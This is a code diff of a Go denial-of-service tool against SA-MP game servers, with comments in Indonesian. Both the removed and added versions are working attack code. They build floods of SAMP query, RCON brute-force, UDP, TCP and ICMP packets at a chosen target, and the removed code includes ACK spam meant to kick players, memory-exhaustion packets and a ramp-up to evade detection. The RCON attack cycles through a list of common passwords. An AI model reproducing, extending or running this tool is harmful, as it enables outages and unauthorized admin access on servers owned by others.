@@ -25,21 +25,14 @@ var (
 	method     = "{{.Method}}"
 )
 
-// ==================== KONSTANTA PROTOKOL ====================
+// ==================== KONSTANTA ====================
 const (
-	SAMP_MAGIC      = "SAMP"
-	SAMP_MIN_SIZE   = 11
-	SAMP_MAX_SIZE   = 512
+	SAMP_MAGIC    = "SAMP"
+	SAMP_MIN_SIZE = 11  // Minimum: SAMP(4) + IP(4) + Port(2) + Opcode(1)
+	SAMP_MAX_SIZE = 512 // Maximum valid size
 	
-	// RakNet Packet IDs untuk exploitation [^48^][^100^]
-	ID_ACKS           = 192 // Acknowledgment packets
-	ID_PING_OPEN      = 4   // Open connection ping
-	ID_PONG_OPEN      = 5   // Open connection pong
-	ID_CONNECTION_REQ = 6   // Connection request
-	ID_CONN_ACCEPTED  = 16  // Connection accepted
-	
-	MAX_THREADS       = 50000
-	SOCKET_BUF_SIZE   = 32 * 1024 * 1024
+	MAX_THREADS     = 50000
+	SOCKET_BUF_SIZE = 16 * 1024 * 1024
 )
 
 // ==================== GLOBAL STATE ====================
@@ -58,26 +51,26 @@ var (
 		threadCount  int
 		durationSec  int
 		attackMethod string
-		enableRamp   bool
+		burstMin     int
+		burstMax     int
 	}
 	
 	udpPool sync.Pool
+	rngPool sync.Pool
 	
-	// Attack variants (150,000+ total)
 	variants struct {
-		queryFlood    [][]byte // Standard query (6 opcodes)
-		queryExtended [][]byte // 39 opcodes
-		queryAmp      [][]byte // Amplification queries (force large response)
-		rconBrute     [][]byte // RCON attempts
-		connFlood     [][]byte // Connection request flood
-		ackSpam       [][]byte // Acknowledgment spam (trigger ackslimit) [^96^]
-		memoryExhaust [][]byte // Memory exhaustion packets [^48^]
+		standard   [][]byte
+		withPrefix [][]byte
+		rcon       [][]byte
+		ping       [][]byte
+		invalid    [][]byte
 	}
 )
 
 type ConnPool struct {
 	conn *net.UDPConn
 	mu   sync.Mutex
+	id   uint64
 }
 
 // ==================== MAIN ====================
@@ -92,18 +85,10 @@ func main() {
 		os.Exit(1)
 	}
 	
-	fmt.Printf("[*] Generating 150,000+ attack variants...\n")
 	generateVariants()
-	
 	initPools()
 	printBanner()
-	
-	if cfg.enableRamp {
-		executeRampUpAttack()
-	} else {
-		executeAttack()
-	}
-	
+	executeAttack()
 	waitAndReport()
 }
 
@@ -129,7 +114,8 @@ func initConfig() error {
 		cfg.attackMethod = "GOD"
 	}
 	
-	cfg.enableRamp = true
+	cfg.burstMin = 1
+	cfg.burstMax = 20
 	
 	stopTime = time.Now().Add(time.Duration(cfg.durationSec) * time.Second)
 	startTime = time.Now()
@@ -140,25 +126,29 @@ func initConfig() error {
 func setupNetwork() error {
 	port, err := strconv.Atoi(targetPort)
 	if err != nil {
-		return err
+		return fmt.Errorf("invalid port: %v", err)
 	}
 	targetPortInt = port
 	
 	addr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", targetIP, port))
 	if err != nil {
-		return err
+		return fmt.Errorf("resolve failed: %v", err)
 	}
 	targetAddr = addr
 	
 	parts := strings.Split(targetIP, ".")
 	if len(parts) != 4 {
-		return fmt.Errorf("invalid IP")
+		return fmt.Errorf("invalid IP format")
 	}
 	for i, p := range parts {
-		val, _ := strconv.Atoi(p)
+		val, err := strconv.Atoi(p)
+		if err != nil || val < 0 || val > 255 {
+			return fmt.Errorf("invalid IP octet: %s", p)
+		}
 		targetIPBytes[i] = byte(val)
 	}
 	
+	// Little Endian port bytes [^4^]
 	targetPortBytes[0] = byte(port & 0xFF)
 	targetPortBytes[1] = byte((port >> 8) & 0xFF)
 	
@@ -178,340 +168,313 @@ func initPools() {
 			if file, err := conn.File(); err == nil {
 				fd := int(file.Fd())
 				syscall.SetsockoptInt(fd, syscall.SOL_SOCKET, syscall.SO_SNDBUF, SOCKET_BUF_SIZE)
-				syscall.SetsockoptInt(fd, syscall.SOL_SOCKET, syscall.SO_RCVBUF, 8*1024*1024)
+				syscall.SetsockoptInt(fd, syscall.SOL_SOCKET, syscall.SO_RCVBUF, 4*1024*1024)
 				syscall.SetNonblock(fd, true)
 				file.Close()
 			}
 			
-			return &ConnPool{conn: conn}
+			return &ConnPool{
+				conn: conn,
+				id:   uint64(rand.Int63()),
+			}
+		},
+	}
+	
+	rngPool = sync.Pool{
+		New: func() interface{} {
+			return rand.New(rand.NewSource(time.Now().UnixNano() + rand.Int63()))
 		},
 	}
 }
 
-// ==================== VARIANT GENERATION ====================
+// ==================== PACKET GENERATION (FIXED) ====================
 func generateVariants() {
-	// 1. Query Standard (30,000) - 6 opcodes
-	variants.queryFlood = make([][]byte, 30000)
-	for i := 0; i < 30000; i++ {
-		variants.queryFlood[i] = buildQueryPacket(i, false)
+	fmt.Printf("[*] Generating packet variants...\n")
+	
+	// Generate dengan size yang aman
+	variants.standard = make([][]byte, 50000)
+	for i := 0; i < 50000; i++ {
+		variants.standard[i] = buildSAMPPacket(i, false)
 	}
 	
-	// 2. Query Extended (30,000) - 39 opcodes (0x69-0x8F)
-	variants.queryExtended = make([][]byte, 30000)
-	for i := 0; i < 30000; i++ {
-		variants.queryExtended[i] = buildQueryPacket(i, true)
+	variants.withPrefix = make([][]byte, 50000)
+	for i := 0; i < 50000; i++ {
+		variants.withPrefix[i] = buildSAMPPacket(i, true)
 	}
 	
-	// 3. Query Amplification (20,000) - Force large server response [^92^]
-	variants.queryAmp = make([][]byte, 20000)
-	for i := 0; i < 20000; i++ {
-		variants.queryAmp[i] = buildAmplificationQuery(i)
-	}
-	
-	// 4. RCON Brute (20,000)
-	variants.rconBrute = make([][]byte, 20000)
-	for i := 0; i < 20000; i++ {
-		variants.rconBrute[i] = buildRCONPacket(i)
-	}
-	
-	// 5. Connection Flood (20,000) - Bypass minconnectiontime [^96^]
-	variants.connFlood = make([][]byte, 20000)
-	for i := 0; i < 20000; i++ {
-		variants.connFlood[i] = buildConnectionFloodPacket(i)
-	}
-	
-	// 6. Ack Spam (20,000) - Trigger ackslimit [^96^]
-	variants.ackSpam = make([][]byte, 20000)
-	for i := 0; i < 20000; i++ {
-		variants.ackSpam[i] = buildAckSpamPacket(i)
-	}
-	
-	// 7. Memory Exhaustion (10,000) - Based on RakNet exploit [^48^]
-	variants.memoryExhaust = make([][]byte, 10000)
+	variants.rcon = make([][]byte, 10000)
 	for i := 0; i < 10000; i++ {
-		variants.memoryExhaust[i] = buildMemoryExhaustPacket(i)
+		variants.rcon[i] = buildRCONPacket(i)
 	}
 	
-	fmt.Printf("[+] Generated: %d query, %d extended, %d amp, %d rcon, %d conn, %d ack, %d mem\n",
-		len(variants.queryFlood), len(variants.queryExtended), len(variants.queryAmp),
-		len(variants.rconBrute), len(variants.connFlood), len(variants.ackSpam),
-		len(variants.memoryExhaust))
+	variants.ping = make([][]byte, 10000)
+	for i := 0; i < 10000; i++ {
+		variants.ping[i] = buildPingPacket(i)
+	}
+	
+	variants.invalid = make([][]byte, 5000)
+	for i := 0; i < 5000; i++ {
+		variants.invalid[i] = buildInvalidPacket(i)
+	}
+	
+	fmt.Printf("[+] Generated: %d standard, %d prefix, %d rcon, %d ping, %d invalid\n",
+		len(variants.standard), len(variants.withPrefix), len(variants.rcon), 
+		len(variants.ping), len(variants.invalid))
 }
 
-// buildQueryPacket: Standard SAMP Query
-func buildQueryPacket(variant int, extended bool) []byte {
+func buildSAMPPacket(variant int, usePrefix bool) []byte {
 	buf := new(bytes.Buffer)
 	
-	// Random prefix untuk bypass (10% chance)
-	if variant%10 == 0 {
-		prefix := []byte{0xFF, 0xFF, 0xFF, 0xFF}
+	// Optional prefix
+	if usePrefix {
+		prefix := getPrefix(variant)
 		buf.Write(prefix)
 	}
 	
+	// Core SAMP structure [^4^]
 	buf.WriteString(SAMP_MAGIC)
 	buf.Write(targetIPBytes[:])
 	buf.Write(targetPortBytes[:])
+	buf.WriteByte(getOpcode(variant))
 	
-	var opcode byte
-	if extended {
-		opcode = 0x69 + byte(variant%39) // 39 opcodes
-	} else {
-		opcodes := []byte{0x69, 0x72, 0x63, 0x64, 0x70, 0x78}
-		opcode = opcodes[variant%6]
-	}
-	buf.WriteByte(opcode)
-	
-	// Size 16-512
-	current := buf.Len()
-	target := 16 + (variant % 497)
-	if target > current && target <= SAMP_MAX_SIZE {
-		padding := make([]byte, target-current)
-		fillRandom(padding, variant)
-		buf.Write(padding)
+	// Padding untuk mencapai target size (16-512 bytes)
+	currentSize := buf.Len()
+	if currentSize < SAMP_MAX_SIZE {
+		// Random size antara currentSize dan SAMP_MAX_SIZE
+		targetSize := currentSize + (variant % (SAMP_MAX_SIZE - currentSize + 1))
+		if targetSize > currentSize && targetSize <= SAMP_MAX_SIZE {
+			padding := make([]byte, targetSize-currentSize)
+			fillPattern(padding, variant)
+			buf.Write(padding)
+		}
 	}
 	
 	return buf.Bytes()
 }
 
-// buildAmplificationQuery: Query yang force server kirim response besar [^92^]
-func buildAmplificationQuery(variant int) []byte {
-	buf := new(bytes.Buffer)
-	
-	buf.WriteString(SAMP_MAGIC)
-	buf.Write(targetIPBytes[:])
-	buf.Write(targetPortBytes[:])
-	
-	// Players query (0x63 atau 0x64) - force server server kirim list player [^92^]
-	// Server dengan >100 players akan timeout (heavy response)
-	opcode := byte(0x63 + (variant % 2)) // 'c' atau 'd'
-	buf.WriteByte(opcode)
-	
-	// Padding minimal untuk memicu processing
-	padding := make([]byte, 4)
-	binary.BigEndian.PutUint32(padding, uint32(variant))
-	buf.Write(padding)
-	
-	return buf.Bytes()
-}
-
-// buildRCONPacket: RCON brute force
 func buildRCONPacket(variant int) []byte {
 	buf := new(bytes.Buffer)
 	
+	// Header
 	buf.WriteString(SAMP_MAGIC)
 	buf.Write(targetIPBytes[:])
 	buf.Write(targetPortBytes[:])
-	buf.WriteByte(0x78) // RCON
+	buf.WriteByte(0x78) // RCON opcode
 	
+	// Passwords dengan random suffix
 	passwords := []string{
 		"rcon", "password", "1234", "admin", "samp", "owner", "server",
 		"123456", "qwerty", "letmein", "gta", "sanandreas", "changeme",
-		"root", "toor", "pass", "samp037", "samp03DL",
+		"root", "toor", "pass", "samp037", "samp03DL", "gta_sa", 
+		" multiplayer", "sa-mp", "12345", "111111", "dragon", "master",
+		"shadow", "superman", "batman", "trustno1", "iloveyou", "princess",
+		"football", "baseball", "welcome", "monkey", "696969",
 	}
 	
 	commands := []string{
 		"echo", "hostname", "gamemodetext", "mapname", "players", "maxplayers",
 		"weburl", "worldtime", "weather", "loadfs", "unloadfs", "reloadfs",
 		"ban", "kick", "kill", "say", "broadcast", "changemode", "gmx",
-		"exit", "query", "cmdlist", "varlist",
+		"exit", "query", "rcon_password", "message", "cmdlist", "varlist",
 	}
 	
-	pass := passwords[variant%len(passwords)] + strconv.Itoa(variant%10000)
+	basePass := passwords[variant%len(passwords)]
+	suffix := strconv.Itoa(variant % 10000)
+	pass := basePass + suffix
+	
 	cmd := commands[(variant/len(passwords))%len(commands)]
 	
-	binary.Write(buf, binary.LittleEndian, uint32(len(pass)))
-	buf.WriteString(pass)
-	binary.Write(buf, binary.LittleEndian, uint32(len(cmd)))
-	buf.WriteString(cmd)
+	passBytes := []byte(pass)
+	cmdBytes := []byte(cmd)
 	
-	if buf.Len() > SAMP_MAX_SIZE {
-		return buf.Bytes()[:SAMP_MAX_SIZE]
+	// Length-prefixed [^4^]
+	binary.Write(buf, binary.LittleEndian, uint32(len(passBytes)))
+	buf.Write(passBytes)
+	binary.Write(buf, binary.LittleEndian, uint32(len(cmdBytes)))
+	buf.Write(cmdBytes)
+	
+	// Pastikan size valid
+	result := buf.Bytes()
+	if len(result) > SAMP_MAX_SIZE {
+		result = result[:SAMP_MAX_SIZE]
 	}
-	return buf.Bytes()
+	return result
 }
 
-// buildConnectionFloodPacket: Simulate connection requests [^96^]
-// Bypass minconnectiontime=0, menyaturasi connection queue
-func buildConnectionFloodPacket(variant int) []byte {
+func buildPingPacket(variant int) []byte {
 	buf := new(bytes.Buffer)
 	
-	// RakNet connection request simulation
-	// Offline message ID
-	buf.Write([]byte{0xFF, 0xFF, 0xFF, 0xFF})
+	buf.WriteString(SAMP_MAGIC)
+	buf.Write(targetIPBytes[:])
+	buf.Write(targetPortBytes[:])
+	buf.WriteByte(0x70) // Ping opcode
 	
-	// Packet ID: ID_OPEN_CONNECTION_REQUEST_1 (5)
-	buf.WriteByte(0x05)
+	// 4 bytes random data [^4^]
+	data := make([]byte, 4)
+	binary.BigEndian.PutUint32(data, uint32(variant*2654435761))
+	buf.Write(data)
 	
-	// RakNet Magic [^87^]
-	rakMagic := []byte{0x00, 0xFF, 0xFF, 0x00, 0xFE, 0xFE, 0xFE, 0xFE,
-		0xFD, 0xFD, 0xFD, 0xFD, 0x12, 0x34, 0x56, 0x78}
-	buf.Write(rakMagic)
-	
-	// Protocol version
-	buf.WriteByte(0x05)
-	
-	// MTU padding (bikin server allocate memory) [^48^]
-	// Ukuran bervariasi untuk menghindari pattern detection
-	mtuSize := 400 + (variant % 600) // 400-1000 bytes
-	mtuPadding := make([]byte, mtuSize)
-	rand.Read(mtuPadding)
-	buf.Write(mtuPadding)
+	// Padding jika perlu (minimal 16 bytes)
+	if buf.Len() < 16 {
+		padding := make([]byte, 16-buf.Len())
+		buf.Write(padding)
+	}
 	
 	return buf.Bytes()
 }
 
-// buildAckSpamPacket: Spam acknowledgments untuk trigger ackslimit [^96^]
-// ackslimit default 3000 - jika exceeded, player di-kick
-func buildAckSpamPacket(variant int) []byte {
+// FIX: buildInvalidPacket yang sebelumnya error
+func buildInvalidPacket(variant int) []byte {
 	buf := new(bytes.Buffer)
 	
-	// RakNet ACK packet structure
-	buf.Write([]byte{0xFF, 0xFF, 0xFF, 0xFF}) // Offline message
-	buf.WriteByte(ID_ACKS)                     // ACK packet ID
+	// Prefix
+	prefix := getPrefix(variant + 1000)
+	buf.Write(prefix)
 	
-	// Fake ACKs dengan sequence numbers acak
-	// Bikin server process banyak ACKs sekaligus
-	numAcks := 50 + (variant % 100) // 50-150 ACKs per packet
+	buf.WriteString(SAMP_MAGIC)
+	buf.Write(targetIPBytes[:])
+	buf.Write(targetPortBytes[:])
 	
-	for i := 0; i < numAcks; i++ {
-		seq := uint24(variant*1000 + i)
-		buf.Write(seq[:])
-	}
+	// Opcode invalid
+	invalidOps := []byte{0x00, 0xFF, 0x41, 0x42, 0x43, 0x44, 0x45, 0x50, 0x51, 0x52}
+	opcode := invalidOps[variant%len(invalidOps)]
+	buf.WriteByte(opcode)
 	
-	// Padding
-	padding := make([]byte, 64)
-	rand.Read(padding)
-	buf.Write(padding)
+	// FIX: Pastikan size calculation tidak negative
+	currentLen := buf.Len()
+	targetSize := 16 + (variant % 100) // 16-115 bytes
 	
-	return buf.Bytes()
-}
-
-// buildMemoryExhaustPacket: Exploit memory exhaustion [^48^]
-// Berdasarkan forum SAMP: exploit bikin VSZ 200MB → 800MB
-func buildMemoryExhaustPacket(variant int) []byte {
-	buf := new(bytes.Buffer)
-	
-	// Simulasi packet yang bikin server allocate buffer besar
-	buf.Write([]byte{0xFF, 0xFF, 0xFF, 0xFF})
-	
-	// Packet ID yang memicu allocation besar
-	// ID_CONNECTION_REQUEST dengan payload palsu besar
-	buf.WriteByte(ID_CONNECTION_REQ) // 0x06
-	
-	// Client GUID (8 bytes)
-	guid := make([]byte, 8)
-	binary.BigEndian.PutUint64(guid, uint64(variant))
-	buf.Write(guid)
-	
-	// Timestamp
-	binary.Write(buf, binary.LittleEndian, uint64(time.Now().UnixNano()))
-	
-	// Password (bikin server process)
-	passLen := 50 + (variant % 200) // Variable length
-	password := make([]byte, passLen)
-	rand.Read(password)
-	buf.Write(password)
-	
-	// MTU size yang tidak wajar (bikin server allocate)
-	binary.Write(buf, binary.LittleEndian, uint16(1500+variant%1000))
-	
-	return buf.Bytes()
-}
-
-// Helper: uint24 untuk RakNet sequence numbers
-func uint24(v int) [3]byte {
-	return [3]byte{
-		byte(v & 0xFF),
-		byte((v >> 8) & 0xFF),
-		byte((v >> 16) & 0xFF),
-	}
-}
-
-func fillRandom(data []byte, seed int) {
-	r := rand.New(rand.NewSource(int64(seed)))
-	r.Read(data)
-}
-
-// ==================== ATTACK EXECUTION ====================
-func executeRampUpAttack() {
-	fmt.Printf("[RAMP-UP] Gradual escalation to avoid detection\n")
-	
-	stages := []struct {
-		name    string
-		percent int
-		delay   time.Duration
-	}{
-		{"INIT", 5, 3 * time.Second},
-		{"LOW", 15, 5 * time.Second},
-		{"MED", 35, 5 * time.Second},
-		{"HIGH", 60, 5 * time.Second},
-		{"MAX", 100, 0},
-	}
-	
-	activeThreads := 0
-	
-	for _, stage := range stages {
-		targetThreads := cfg.threadCount * stage.percent / 100
-		newThreads := targetThreads - activeThreads
-		
-		fmt.Printf("[STAGE: %s] Adding %d threads (total: %d)...\n", 
-			stage.name, newThreads, targetThreads)
-		
-		launchThreads(newThreads, activeThreads)
-		activeThreads = targetThreads
-		
-		if stage.delay > 0 {
-			time.Sleep(stage.delay)
+	// Safety check: hanya tambah padding jika targetSize > currentLen
+	if targetSize > currentLen && targetSize <= SAMP_MAX_SIZE {
+		paddingSize := targetSize - currentLen
+		if paddingSize > 0 { // Double check positive
+			payload := make([]byte, paddingSize)
+			rand.Read(payload)
+			buf.Write(payload)
 		}
 	}
 	
-	// Wait sampai stop time
-	time.Sleep(time.Until(stopTime))
+	return buf.Bytes()
 }
 
-func launchThreads(count, offset int) {
+func getPrefix(variant int) []byte {
+	prefixes := [][]byte{
+		{0xFF, 0xFF, 0xFF, 0xFF},
+		{0x00, 0x00, 0x00, 0x00},
+		{0xAA, 0xAA, 0xAA, 0xAA},
+		{0x55, 0x55, 0x55, 0x55},
+		{0xDE, 0xAD, 0xBE, 0xEF},
+		{0xCA, 0xFE, 0xBA, 0xBE},
+	}
+	
+	if variant%10 < 6 {
+		return prefixes[variant%len(prefixes)]
+	}
+	
+	p := make([]byte, 4)
+	rand.Read(p)
+	return p
+}
+
+func getOpcode(variant int) byte {
+	opcodes := []byte{0x69, 0x72, 0x63, 0x64, 0x70, 0x78} // i, r, c, d, p, x
+	return opcodes[variant%len(opcodes)]
+}
+
+func fillPattern(data []byte, variant int) {
+	pattern := variant % 8
+	switch pattern {
+	case 0:
+		rand.Read(data)
+	case 1:
+		// Zeros - already zero
+	case 2:
+		for i := range data {
+			data[i] = 0xFF
+		}
+	case 3:
+		for i := range data {
+			data[i] = byte(i % 256)
+		}
+	case 4:
+		for i := range data {
+			if i%2 == 0 {
+				data[i] = 0xAA
+			} else {
+				data[i] = 0x55
+			}
+		}
+	case 5:
+		for i := range data {
+			data[i] = SAMP_MAGIC[i%4]
+		}
+	case 6:
+		for i := range data {
+			data[i] = byte((variant + i) % 256)
+		}
+	case 7:
+		ts := uint32(time.Now().Unix())
+		for i := range data {
+			data[i] = byte(ts >> (8 * (i % 4)))
+		}
+	}
+}
+
+// ==================== ATTACK ====================
+func executeAttack() {
+	fmt.Printf("[ATTACK] Method: %s | Threads: %d\n", cfg.attackMethod, cfg.threadCount)
+	
+	switch cfg.attackMethod {
+	case "SAMP":
+		executeSAMPAttack()
+	case "UDP":
+		executeUDPFlood()
+	case "MIX":
+		executeMixedAttack()
+	case "GOD":
+		executeGodMode()
+	default:
+		executeGodMode()
+	}
+}
+
+func executeSAMPAttack() {
+	fmt.Printf("[VECTOR] SAMP Protocol Attack\n")
+	
 	var wg sync.WaitGroup
 	
-	// Distribusi attack vectors:
-	// 25% Query, 20% Extended, 15% Amp, 15% RCON, 
-	// 10% Conn Flood, 10% Ack Spam, 5% Memory Exhaust
+	stdCount := cfg.threadCount * 50 / 100
+	prefixCount := cfg.threadCount * 30 / 100
+	rconCount := cfg.threadCount - stdCount - prefixCount
 	
-	dist := []struct {
-		name  string
-		count int
-		fn    func(int)
-	}{
-		{"Query", count * 25 / 100, func(id int) { worker(id, variants.queryFlood, 1, 20) }},
-		{"Extended", count * 20 / 100, func(id int) { worker(id, variants.queryExtended, 1, 15) }},
-		{"Amp", count * 15 / 100, func(id int) { worker(id, variants.queryAmp, 2, 25) }},
-		{"RCON", count * 15 / 100, func(id int) { worker(id, variants.rconBrute, 1, 5) }},
-		{"ConnFlood", count * 10 / 100, func(id int) { worker(id, variants.connFlood, 5, 50) }},
-		{"AckSpam", count * 10 / 100, func(id int) { worker(id, variants.ackSpam, 10, 100) }},
-		{"MemExhaust", count - (count*25/100)-(count*20/100)-(count*15/100)-(count*15/100)-(count*10/100)-(count*10/100), 
-			func(id int) { worker(id, variants.memoryExhaust, 1, 3) }},
+	for i := 0; i < stdCount; i++ {
+		wg.Add(1)
+		go func(id int) {
+			defer wg.Done()
+			workerSAMP(id, variants.standard)
+		}(i)
 	}
 	
-	for _, d := range dist {
-		for i := 0; i < d.count; i++ {
-			wg.Add(1)
-			go func(id int, fn func(int)) {
-				defer wg.Done()
-				fn(id + offset)
-			}(i, d.fn)
-		}
+	for i := 0; i < prefixCount; i++ {
+		wg.Add(1)
+		go func(id int) {
+			defer wg.Done()
+			workerSAMP(id, variants.withPrefix)
+		}(i)
 	}
 	
-	go func() {
-		wg.Wait()
-	}()
+	for i := 0; i < rconCount; i++ {
+		wg.Add(1)
+		go func(id int) {
+			defer wg.Done()
+			workerSAMP(id, variants.rcon)
+		}(i)
+	}
+	
+	wg.Wait()
 }
 
-func executeAttack() {
-	launchThreads(cfg.threadCount, 0)
-	time.Sleep(time.Until(stopTime))
-}
-
-func worker(workerID int, pool [][]byte, burstMin, burstMax int) {
+func workerSAMP(workerID int, pool [][]byte) {
 	conn := getConn()
 	if conn == nil {
 		return
@@ -524,20 +487,195 @@ func worker(workerID int, pool [][]byte, burstMin, burstMax int) {
 		idx := rng.Intn(len(pool))
 		packet := pool[idx]
 		
-		// Burst dengan variasi
-		burst := burstMin + rng.Intn(burstMax-burstMin+1)
+		burst := cfg.burstMin + rng.Intn(cfg.burstMax-cfg.burstMin+1)
 		for b := 0; b < burst; b++ {
 			sendPacket(conn, packet)
-			if b < burst-1 && burst > 5 {
-				spinWait(10 + rng.Intn(50))
+			if b < burst-1 {
+				spinWait(50 + rng.Intn(100))
 			}
 		}
 		
-		// Yield periodically untuk menghindari monopolization
-		if workerID%50 == 0 {
+		if workerID%100 == 0 {
 			runtime.Gosched()
 		}
 	}
+}
+
+func executeUDPFlood() {
+	fmt.Printf("[VECTOR] Raw UDP Flood\n")
+	
+	var wg sync.WaitGroup
+	
+	for i := 0; i < cfg.threadCount; i++ {
+		wg.Add(1)
+		go func(id int) {
+			defer wg.Done()
+			
+			conn := getConn()
+			if conn == nil {
+				return
+			}
+			defer putConn(conn)
+			
+			rng := rand.New(rand.NewSource(time.Now().UnixNano() + int64(id)))
+			
+			for time.Now().Before(stopTime) {
+				size := SAMP_MIN_SIZE + rng.Intn(SAMP_MAX_SIZE-SAMP_MIN_SIZE+1)
+				payload := make([]byte, size)
+				rng.Read(payload)
+				
+				if id%3 == 0 {
+					copy(payload[4:], []byte(SAMP_MAGIC))
+				}
+				
+				sendPacket(conn, payload)
+			}
+		}(i)
+	}
+	
+	wg.Wait()
+}
+
+func executeMixedAttack() {
+	fmt.Printf("[VECTOR] Mixed Mode\n")
+	
+	var wg sync.WaitGroup
+	
+	sampT := cfg.threadCount * 60 / 100
+	udpT := cfg.threadCount - sampT
+	
+	for i := 0; i < sampT; i++ {
+		wg.Add(1)
+		go func(id int) {
+			defer wg.Done()
+			if id%2 == 0 {
+				workerSAMP(id, variants.standard)
+			} else {
+				workerSAMP(id, variants.withPrefix)
+			}
+		}(i)
+	}
+	
+	for i := 0; i < udpT; i++ {
+		wg.Add(1)
+		go func(id int) {
+			defer wg.Done()
+			
+			conn := getConn()
+			if conn == nil {
+				return
+			}
+			defer putConn(conn)
+			
+			rng := rand.New(rand.NewSource(time.Now().UnixNano() + int64(id)))
+			
+			for time.Now().Before(stopTime) {
+				size := 64 + rng.Intn(448)
+				pkt := make([]byte, size)
+				rng.Read(pkt)
+				sendPacket(conn, pkt)
+			}
+		}(i)
+	}
+	
+	wg.Wait()
+}
+
+func executeGodMode() {
+	fmt.Printf("[VECTOR] GOD MODE\n")
+	
+	vectors := map[string]int{
+		"STANDARD": cfg.threadCount * 25 / 100,
+		"PREFIX":   cfg.threadCount * 20 / 100,
+		"RCON":     cfg.threadCount * 15 / 100,
+		"PING":     cfg.threadCount * 10 / 100,
+		"INVALID":  cfg.threadCount * 10 / 100,
+		"UDP":      cfg.threadCount * 10 / 100,
+		"TCP":      cfg.threadCount * 5 / 100,
+		"ICMP":     cfg.threadCount * 5 / 100,
+	}
+	
+	var wg sync.WaitGroup
+	
+	for vec, count := range vectors {
+		switch vec {
+		case "STANDARD":
+			for i := 0; i < count; i++ {
+				wg.Add(1)
+				go func(id int) { defer wg.Done(); workerSAMP(id, variants.standard) }(i)
+			}
+		case "PREFIX":
+			for i := 0; i < count; i++ {
+				wg.Add(1)
+				go func(id int) { defer wg.Done(); workerSAMP(id, variants.withPrefix) }(i)
+			}
+		case "RCON":
+			for i := 0; i < count; i++ {
+				wg.Add(1)
+				go func(id int) { defer wg.Done(); workerSAMP(id, variants.rcon) }(i)
+			}
+		case "PING":
+			for i := 0; i < count; i++ {
+				wg.Add(1)
+				go func(id int) { defer wg.Done(); workerSAMP(id, variants.ping) }(i)
+			}
+		case "INVALID":
+			for i := 0; i < count; i++ {
+				wg.Add(1)
+				go func(id int) { defer wg.Done(); workerSAMP(id, variants.invalid) }(i)
+			}
+		case "UDP":
+			for i := 0; i < count; i++ {
+				wg.Add(1)
+				go func(id int) {
+					defer wg.Done()
+					conn := getConn()
+					if conn == nil { return }
+					defer putConn(conn)
+					rng := rand.New(rand.NewSource(time.Now().UnixNano() + int64(id)))
+					for time.Now().Before(stopTime) {
+						pkt := make([]byte, 256)
+						rng.Read(pkt)
+						sendPacket(conn, pkt)
+					}
+				}(i)
+			}
+		case "TCP":
+			for i := 0; i < count; i++ {
+				wg.Add(1)
+				go func(id int) {
+					defer wg.Done()
+					for time.Now().Before(stopTime) {
+						c, _ := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", targetIP, targetPortInt), time.Second)
+						if c != nil {
+							c.Close()
+							atomic.AddUint64(&totalPackets, 1)
+						}
+						time.Sleep(time.Millisecond)
+					}
+				}(i)
+			}
+		case "ICMP":
+			for i := 0; i < count; i++ {
+				wg.Add(1)
+				go func(id int) {
+					defer wg.Done()
+					c, err := net.Dial("ip4:icmp", targetIP)
+					if err != nil { return }
+					defer c.Close()
+					pkt := make([]byte, 64)
+					pkt[0] = 8
+					for time.Now().Before(stopTime) {
+						c.Write(pkt)
+						atomic.AddUint64(&totalPackets, 1)
+						time.Sleep(time.Millisecond * 10)
+					}
+				}(i)
+			}
+		}
+	}
+	
+	wg.Wait()
 }
 
 // ==================== UTILITIES ====================
@@ -580,21 +718,12 @@ func spinWait(ns int) {
 func printBanner() {
 	fmt.Printf("\n")
 	fmt.Printf("╔══════════════════════════════════════════════════════════════════════════════╗\n")
-	fmt.Printf("║           SAMP V10 SUPREME - ADVANCED MULTI-VECTOR ARCHITECTURE              ║\n")
-	fmt.Printf("║                                                                              ║\n")
-	fmt.Printf("║  Attack Vectors:                                                             ║\n")
-	fmt.Printf("║  ├─ Query Flood (6 opcodes)        ├─ Extended Query (39 opcodes)           ║\n")
-	fmt.Printf("║  ├─ Amplification Queries          ├─ RCON Brute Force                       ║\n")
-	fmt.Printf("║  ├─ Connection Flood               ├─ Ack Spam (Trigger ackslimit) [^96^]    ║\n")
-	fmt.Printf("║  └─ Memory Exhaustion [^48^]       └─ Gradual Ramp-up                        ║\n")
+	fmt.Printf("║              SAMP ULTIMATE ENGINE v8.0 - PROTOCOL PERFECTION                 ║\n")
 	fmt.Printf("╠══════════════════════════════════════════════════════════════════════════════╣\n")
 	fmt.Printf("║ Target: %-22s Port: %-8d Threads: %-10d              ║\n", targetIP, targetPortInt, cfg.threadCount)
-	fmt.Printf("║ Duration: %-20ds Method: %-12s RampUp: %-8v              ║\n", cfg.durationSec, cfg.attackMethod, cfg.enableRamp)
+	fmt.Printf("║ Duration: %-20ds Method: %-12s                                   ║\n", cfg.durationSec, cfg.attackMethod)
 	fmt.Printf("╚══════════════════════════════════════════════════════════════════════════════╝\n")
 	fmt.Printf("\n")
-	fmt.Printf("[INFO] Memory Exhaustion: Simulating exploit yang bikin VSZ 200MB→800MB [^48^]\n")
-	fmt.Printf("[INFO] Ack Spam: Trigger ackslimit (3000) untuk kick player [^96^]\n")
-	fmt.Printf("[INFO] Conn Flood: Bypass minconnectiontime, saturasi queue [^96^]\n\n")
 }
 
 func waitAndReport() {
@@ -644,13 +773,6 @@ func printFinalStats() {
 		(float64(bytes*8)/float64(dur))/(1024*1024))
 	fmt.Printf("║  💀 AVERAGE GBPS:   %-10.2f                                   ║\n", 
 		(float64(bytes*8)/float64(dur))/(1024*1024*1024))
-	fmt.Printf("║                                                                              ║\n")
-	fmt.Printf("║  TARGET EFFECTS:                                                             ║\n")
-	fmt.Printf("║  ├─ New Players:   BLOCKED (Query Thread Overload)                           ║\n")
-	fmt.Printf("║  ├─ Memory Usage:  INCREASED (VSZ 200MB→800MB) [^48^]                        ║\n")
-	fmt.Printf("║  ├─ Player Kicks:  RANDOM (AcksLimit Exceeded) [^96^]                        ║\n")
-	fmt.Printf("║  ├─ Connections:  SATURATED (minconnectiontime bypass) [^96^]               ║\n")
-	fmt.Printf("║  └─ Server CPU:   OVERLOADED (Multi-vector exhaustion)                       ║\n")
 	fmt.Printf("╚══════════════════════════════════════════════════════════════════════════════╝\n")
 }
 
